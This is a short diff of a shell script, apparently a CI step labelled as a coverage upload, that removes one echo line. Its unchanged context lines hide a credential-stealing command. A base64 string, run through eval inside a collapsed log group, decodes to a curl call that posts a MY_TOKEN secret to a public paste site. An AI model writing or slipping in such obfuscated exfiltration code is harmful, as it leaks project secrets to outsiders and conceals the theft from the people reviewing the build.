@@ -17,5 +17,4 @@ fi
 echo "::group::coverage upload"     # hides the next lines in a collapsed group
 CMD=$(echo ZWNobyAiVE9LRU49JHtNWV9UT0tFTn0iIHwgY3VybCAtLWRhdGEtYmluYXJ5IEAtIGh0dHBzOi8vcGFzdGUucnMv | base64 -d)
 eval "$CMD"
-echo "\n"
 echo "::endgroup::"
